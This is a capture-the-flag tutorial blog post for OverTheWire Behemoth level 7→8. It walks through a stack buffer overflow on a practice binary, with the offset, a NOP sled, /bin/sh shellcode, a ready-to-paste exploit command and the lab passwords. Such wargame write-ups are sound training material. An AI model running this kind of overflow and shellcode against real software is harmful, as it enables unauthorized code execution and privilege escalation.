---
date: 2023-09-05 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Behemoth Level 7 → 8 tutorial!!"
permalink: /posts/overTheWire-Behemoth-Level-7-to-8/
tags: [overthewire, behemoth, exploitation, buffer-overflow, nop-sled, alphanumeric-shellcode, priv-esc, walkthrough, ctf, linux, beginner]
description: "A step by step tutorial for OverTheWire Behemoth Level 7 → 8!!"
---

<!-- Scoped styles -->
<style>
  .behemoth-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .behemoth-nav .nav-left,.behemoth-nav .nav-center,.behemoth-nav .nav-right{flex:1}
  .behemoth-nav .nav-left{text-align:left}
  .behemoth-nav .nav-center{text-align:center}
  .behemoth-nav .nav-right{text-align:right}
  .behemoth-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .behemoth-nav a:hover{transform:translateY(-1px)}
  .behemoth-nav .disabled{opacity:.55}
  :root[data-theme='light'] .behemoth-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="behemoth-nav" aria-label="Behemoth level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Behemoth-Level-6-to-7/' | relative_url }}">← Previous: Level 6 → 7</a>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/behemoth/behemoth8.html" target="_blank" rel="noopener">
      Official (Level 8) ↗
    </a>
  </div>

  <div class="nav-right disabled">
    <span>No more Behemoth level</span>
  </div>
</nav>

## Login

Log in as **behemoth7** using the password you obtained from Level 6 → 7.

```bash
ssh behemoth7@behemoth.labs.overthewire.org -p 2221
# password: baquxouafo
````

---

## Task

The binary **`/behemoth/behemoth7`** zeroes out all environment variables, so the usual “ret2env shellcode” trick won’t work anymore. Instead, we must inject our **own shellcode directly as program input**, use a **NOP sled**, and overwrite EIP with a guessed return address that lands in the sled.

---

## A little bit of Theory

* **No env shellcode**: Normally we put shellcode into `$SHELLCODE` env var, but here the binary clears them.
* **Direct input injection**: Our input buffer → payload (padding + shellcode).
* **NOP sled**: A large sequence of `\x90` (no-op). Even if the return address guess is slightly wrong, CPU “slides” into the shellcode.
* **Overflow mechanics**: Overflow buffer (528 A’s) → overwrite EIP with address inside the sled.
* **Little endian**: Always reverse byte order for addresses (`0xffffd7e0` → `\xe0\xd7\xff\xff`).

**Further reading:**

* [Buffer overflow basics (Wikipedia)](https://en.wikipedia.org/wiki/Stack_buffer_overflow)
* [NOP sleds (Exploit-db)](https://www.exploit-db.com/docs/english/13082-nops---a-beginners-guide.pdf)

---

## Solution

1. **Baseline test**

   ```bash
   ./behemoth7
   # no output, just returns
   ```

   With argument:

   ```bash
   ./behemoth7 AAAA
   # still no output
   ```

   → Suspicious. Let’s `ltrace` it.

2. **Trace with arguments**

   ```bash
   ltrace ./behemoth7 AAAA
   ```

   You’ll see `strcpy` calls → vulnerable.

   All environment vars are cleared (`memset`), so we can’t use `$SHELLCODE`. We must inject shellcode directly.

3. **Overflow test**

   ```bash
   gdb -q ./behemoth7
   (gdb) run $(python -c "print 600 * 'A'")
   ```

   → Segfault at `0x41414141` ✅ we control EIP.

4. **Find exact offset**

   ```bash
   (gdb) run $(python -c "print 528 * 'A' + 'BBBB'")
   ```

   → EIP = `0x42424242` → offset confirmed: **528 bytes**.

5. **Build payload with NOP sled + shellcode**

   ```bash
   python -c 'print "A"*528 + "BBBB" + "\x90"*200 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'
   ```

   (classic `/bin/sh` shellcode)

6. **Find a return address inside sled**

   After running payload inside gdb, dump stack:

   ```bash
   x/500wx $esp
   ```

   You’ll see sled at e.g. `0xffffd7e0`.

7. **Exploit**

   Use `0xffffd7e0` as RET:

   ```bash
   ./behemoth7 $(python -c "print 528 * 'A' + '\xe0\xd7\xff\xff' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")
   ```

   → Shell popped.

8. **Grab password**

   ```bash
   whoami
   # behemoth8
   cat /etc/behemoth_pass/behemoth8
   ```

   Result:

   ```
   pheewij7Ae
   ```

---

## Password

```
pheewij7Ae
```

---

## Troubleshooting

* **Segfault but no shell** → your RET missed the sled. Re-run gdb, pick an address inside the `\x90` block.
* **Wrong offset** → ensure EIP becomes `0x42424242` with test payload.
* **Non-alphanum restriction** → some binaries block non-ASCII chars. Here it accepts raw bytes, so classic shellcode works.
* **Environment cleared** → don’t waste time with `$SHELLCODE`. Direct input only.

---

## Copy-paste quick run (one shot)

```bash
ssh behemoth7@behemoth.labs.overthewire.org -p 2221
# password: baquxouafo

cd /behemoth

# Exploit with offset, RET and sled
./behemoth7 $(python -c "print 528 * 'A' + '\xe0\xd7\xff\xff' + '\x90'*200 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'")

whoami
cat /etc/behemoth_pass/behemoth8
```

---

**Congrats 🎉** You bypassed the env wipe, injected shellcode directly with a NOP sled, and escalated to **behemoth8**!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

